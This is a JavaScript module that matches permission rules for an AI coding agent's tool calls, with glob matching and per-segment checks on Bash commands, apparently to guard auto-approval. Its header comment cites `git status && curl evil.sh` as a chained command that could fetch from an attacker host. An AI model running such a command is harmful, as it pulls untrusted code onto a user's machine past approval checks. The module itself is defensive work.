/**
 * Permission rule matching, compatible with Claude Code's own rule syntax.
 *
 *   "Read"              -> every Read call
 *   "Bash(git status*)" -> Bash whose command matches the glob
 *   "Edit(src/**)"      -> Edit whose file_path matches the glob
 *
 * `*` matches any run of characters, `?` matches one. Everything else is
 * literal.
 *
 * Bash is matched per command segment, with deliberately asymmetric semantics:
 * approving requires *every* segment to be covered, while asking needs only
 * *one*. That asymmetry is what stops `git status && curl evil.sh` from
 * inheriting the approval of its harmless prefix.
 */

/** Which field of tool_input a rule pattern is matched against. */
const SUBJECT_FIELD = {
  Bash: 'command',
  Read: 'file_path',
  Write: 'file_path',
  Edit: 'file_path',
  MultiEdit: 'file_path',
  NotebookEdit: 'notebook_path',
  Glob: 'pattern',
  Grep: 'pattern',
  WebFetch: 'url',
  WebSearch: 'query',
  Task: 'description',
  Agent: 'description',
}

export function subjectOf(toolName, toolInput = {}) {
  const field = SUBJECT_FIELD[toolName]
  const value = field ? toolInput[field] : undefined
  return typeof value === 'string' ? value : ''
}

/** @param {string} glob @returns {RegExp} */
export function globToRegExp(glob) {
  const source = glob
    .split('')
    .map((char) => {
      if (char === '*') return '[\\s\\S]*'
      if (char === '?') return '[\\s\\S]'
      return char.replace(/[.+^${}()|[\]\\]/g, '\\$&')
    })
    .join('')
  return new RegExp(`^${source}$`)
}

/** @param {string} rule @returns {{tool: string, pattern: string|null}|null} */
export function parseRule(rule) {
  if (typeof rule !== 'string') return null
  const match = rule.trim().match(/^([A-Za-z_][\w-]*(?:__[\w-]+)*)(?:\((.*)\)\s*)?$/s)
  if (!match) return null
  return { tool: match[1], pattern: match[2] ?? null }
}

/** Matches one rule against one already-extracted subject string. */
export function matchSubject(rule, toolName, subject) {
  const parsed = parseRule(rule)
  if (!parsed) return false
  if (parsed.tool !== toolName && parsed.tool !== '*') return false
  if (parsed.pattern === null) return true

  // A trailing " *" means "arguments", and arguments are optional: `sort *`
  // should cover the bare `sort` in `… | sort | uniq -c`. Matching the bare
  // form explicitly — rather than writing the rule as `sort*` — keeps `ls *`
  // from also matching `lsof`.
  if (parsed.pattern.endsWith(' *') && subject.trim() === parsed.pattern.slice(0, -2)) {
    return true
  }

  return globToRegExp(parsed.pattern).test(subject)
}

export function matchRule(rule, toolName, toolInput = {}) {
  return matchSubject(rule, toolName, subjectOf(toolName, toolInput))
}

function firstMatch(rules, toolName, subject) {
  return rules.find((rule) => matchSubject(rule, toolName, subject)) ?? null
}

/**
 * ANY semantics — used for `alwaysAsk`. One matching segment is enough to
 * force a prompt for the whole command line.
 *
 * @returns {string|null} the rule that matched
 */
export function findAny(rules, toolName, toolInput = {}, segments = []) {
  if (segments.length > 0) {
    for (const segment of segments) {
      const hit = firstMatch(rules, toolName, segment)
      if (hit) return hit
    }
    return null
  }
  return firstMatch(rules, toolName, subjectOf(toolName, toolInput))
}

/**
 * ALL semantics — used for `autoApprove`. Every segment must be covered, though
 * different segments may be covered by different rules, so `git add . && git
 * status` is approved by two separate rules.
 *
 * @returns {string|null} the rule matching the last segment, for reporting
 */
export function findAll(rules, toolName, toolInput = {}, segments = []) {
  if (segments.length > 0) {
    let last = null
    for (const segment of segments) {
      const hit = firstMatch(rules, toolName, segment)
      if (!hit) return null
      last = hit
    }
    return last
  }
  return firstMatch(rules, toolName, subjectOf(toolName, toolInput))
}
